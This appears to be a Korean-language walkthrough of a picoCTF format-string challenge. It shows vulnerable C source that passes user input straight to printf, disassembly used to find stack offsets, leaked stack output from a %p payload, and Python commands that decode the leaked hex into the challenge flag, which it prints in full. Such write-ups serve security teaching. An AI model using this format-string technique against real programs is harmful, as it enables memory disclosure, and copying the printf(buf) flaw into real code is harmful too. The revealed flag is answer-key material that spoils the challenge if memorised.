```c
#include <stdio.h>
int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the fla
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }

  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);
  printf("Bye!\n");
  fflush(stdout);

  return 0;

}
```
---
flag값 자체가 stack에있을것으로 추정된다 대놓고 FSB

```c
python print(bytes.fromhex("7b4654436f636970")[::-1].decode())
```
이건 헥스값을 문자로 돌리는 파이썬 코드이다 미리알아두도록 하자

```c
   0x0000000000401279 <+131>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040127d <+135>:	lea    rax,[rbp-0x490]
   0x0000000000401284 <+142>:	mov    esi,0x40
   0x0000000000401289 <+147>:	mov    rdi,rax
   0x000000000040128c <+150>:	call   0x4010d0 <fgets@plt>
```
flag는 rbp - 0x490에 위치하고있다

```c
   0x00000000004012f0 <+250>:	lea    rax,[rbp-0x410]
   0x00000000004012f7 <+257>:	mov    rsi,rax
   0x00000000004012fa <+260>:	mov    edi,0x402111
   0x00000000004012ff <+265>:	mov    eax,0x0
   0x0000000000401304 <+270>:	call   0x401100 <__isoc99_scanf@plt>
```
buf는 rbp - 0x410

flag - buf == 0x80 8바이트 16개 offset이다

---
```c
Here's your order: aaaaaaaa0x402118.(nil).0x7d33e5e40a00.(nil).0xba45880.0xa347834.0x7fff188b92f0.0x7d33e5c31e60.0x7d33e5e564d0.0x1.0x7fff188b93c0.(nil).(nil).0x7b4654436f636970.0x355f31346d316e34.0x3478345f33317937.0x35625f673431665f.0x7d663839623764.0x7.0x7d33e5e588d8.0x2300000007.0x206e693374307250.0xa336c797453.0x9.0x7d33e5e69de9.0x7d33e5c3a098.0x7d33e5e564d0.(nil).0x7fff188b93d0.0x6161616161616161.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e
```

0x4141이 우리가넣은 시작점 rsp위치 이므로 여기서 나온뒤에값이 rbp에 가깝다 그래서 
0x4141 기준으로 16개만세면 flag시작점이된다 따라서

```c
0x7b4654436f636970
```
이 flag 시작점이고 해당내용은 flag값이 유출된것이다


```c
pwndbg>  python print(bytes.fromhex("7b4654436f636970")[::-1].decode())
picoCTF{
pwndbg>  python print(bytes.fromhex("355f31346d316e34")[::-1].decode())
4n1m41_5
pwndbg>  python print(bytes.fromhex("3478345f33317937")[::-1].decode())
7y13_4x4
pwndbg>  python print(bytes.fromhex("35625f673431665f")[::-1].decode())
_f14g_b5
pwndbg>  python print(bytes.fromhex("7d663839623764")[::-1].decode())
d7b98f}
```
앞서 언급한 명령어로 flag를 복원해주면 solve완료
